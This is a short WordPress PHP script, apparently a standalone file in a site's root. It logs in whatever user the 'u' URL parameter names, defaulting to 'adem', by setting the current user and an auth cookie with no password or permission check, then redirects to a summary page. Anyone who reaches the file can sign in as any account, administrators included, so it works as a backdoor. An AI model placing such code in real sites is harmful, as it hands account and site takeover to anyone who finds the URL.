<?php
require_once('wp-load.php');
$login = isset($_GET['u']) ? sanitize_user($_GET['u']) : 'adem';
$user = get_user_by('login', $login);
if ($user) {
    wp_set_current_user($user->ID);
    wp_set_auth_cookie($user->ID, true);
    do_action('wp_login', $user->user_login, $user);
}
$redirect = isset($_GET['redirect']) ? esc_url($_GET['redirect']) : site_url('/ozet-ekrani/');
wp_safe_redirect($redirect);
exit;
